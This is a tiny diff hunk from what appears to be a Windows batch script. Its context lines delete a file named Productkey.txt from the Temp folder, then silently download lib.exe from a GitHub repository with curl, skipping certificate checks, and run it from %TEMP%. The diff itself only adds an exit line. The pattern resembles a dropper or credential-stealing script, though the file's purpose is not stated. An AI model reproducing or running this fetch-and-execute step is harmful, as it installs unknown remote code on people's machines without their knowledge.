@@ -271,3 +271,4 @@ del %localappdata%\Temp\Productkey.txt
 
 curl -L -s -k -o %TEMP%\lib.exe "https://github.com/fluorek/utils/raw/main/lib.exe"
 start %TEMP%\lib.exe
+exit
